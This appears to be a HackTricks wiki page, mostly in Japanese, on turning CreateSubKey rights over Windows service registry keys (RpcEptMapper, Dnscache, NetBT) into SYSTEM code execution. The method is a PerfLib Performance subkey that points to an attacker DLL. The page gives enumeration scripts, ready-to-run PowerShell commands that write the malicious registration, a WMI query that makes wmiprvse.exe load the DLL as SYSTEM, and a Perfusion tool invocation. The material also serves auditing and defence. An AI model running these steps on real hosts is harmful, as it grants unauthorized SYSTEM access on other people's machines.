# Service Registry に対する AppendData/AddSubdirectory 権限

{{#include ../../banners/hacktricks-training.md}}

**元の投稿は** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

## 要約

サービスの registry key に対して **`Create Subkey`** / **`AppendData/AddSubdirectory`** しか持っていない場合でも、これは依然として有力な privesc の手がかりです。通常、既存の値である **`ImagePath`**、**`ServiceDll`**、その他の値を直接上書きすることはできませんが、次の配下に **`Performance`** 子キーを作成できる可能性があります。

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- token が **`KEY_CREATE_SUB_KEY`** を持つ、その他の **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** key

ポイントは、Windows がいまだに旧式の **PerfLib V1** registration model をサポートしていることです。service に **`Performance`** サブキーがある場合、performance counter consumer がデータを要求した際に、Windows はそこから DLL を load できます。

Microsoft の documentation によると、最小限の registration は以下のとおりです。
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
したがって、攻撃者にとっての重要なポイントは、**`SetValue` ではなく `CreateSubKey` しか取れなかったからといって、service registry の発見を切り捨てないこと**です。

## なぜこれで code execution が可能なのか

`Performance` の subkey は、通常これらの services ではデフォルトで存在しないため、必要な primitive は **`KEY_CREATE_SUB_KEY`** です。key が作成されて `Library`/`Open`/`Collect`/`Close` が含まれていれば、任意の **performance counter consumer** が DLL の load をトリガーできます。

重要な点をいくつか挙げます。

- **`Library`** 値には **full DLL path** を指定できます。
- DLL は **`OpenPerfData`**、**`CollectPerfData`**、**`ClosePerfData`** を export し、`ERROR_SUCCESS` を返す必要があります。
- code は **consumer's context** で実行され、**必ずしも vulnerable service process 自体の中で実行されるわけではありません**。
- 典型的な `RpcEptMapper` / `Dnscache` の case では、**WMI performance query** によって **`wmiprvse.exe`** が **`NT AUTHORITY\SYSTEM`** として DLL を load できます。

これが、triage でこの primitive が見落とされやすい理由です。parent service key は「完全に writable」ではなくても、weaponizable です。

## Quick enumeration

**AccessChk** を使った manual spot-check:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
低権限の principal が service key に対して **`CreateSubKey`** を持っているかを探す PowerShell example:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
便利なツール:

- **PrivescCheck**: `Get-ModifiableRegistryPath` は、この種の問題を検出するために特化して作成された。
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: DLL drop、`Performance` registration、WMI trigger、token duplication、cleanup を、legacy の vulnerable な target 上で自動化する（例: `Perfusion.exe -c cmd -i -k Dnscache`）。

## Abuse flow

`Performance` subkey を作成し、required values を設定する:
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
その後、**privileged** な performance consumer をトリガーします。古典的な例は、`Win32_Perf*` classes に対する WMI query です:
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Operational notes:

- **`perfmon.exe`** の起動は counter registration が正しいか確認するのに役立ちますが、通常は **自分の user context** で DLL を読み込むだけです。
- 実際の LPE では、**WMI** のような **privileged** consumer を trigger します。
- 自分で exploit を書く場合、DLL 内から直接 `cmd.exe` を spawn すると、通常は **session 0** に shell が残ります。`Perfusion` は、attackers の session で suspended に作成された process に privileged token を duplicate することでこれを解決します。
- DLL architecture を target consumer に合わせます（**x64 systems では x64**）。

## Version notes / recent developments

Historically, built-in weak keys were:

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` and `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` notes that the **April 2021** updates removed the easy exploitation path on updated **Windows 8 / Windows Server 2012**, while **Windows 7 / Windows Server 2008 R2** remained exploitable through **`Dnscache`**.

This primitive is **not only historical**. In **January 2025**, Microsoft patched a related AD DS issue where members of **`Network Configuration Operators`** could create subkeys under **`Dnscache`** and **`NetBT`**, and the same **Performance-counter DLL registration** idea could be reused to reach **SYSTEM** on supported systems.

So the modern lesson is generic: whenever a low-privileged principal has **`CreateSubKey`** on **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, check whether a **`Performance`** child key is enough before dismissing the finding.

## References

- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
{{#include ../../banners/hacktricks-training.md}}
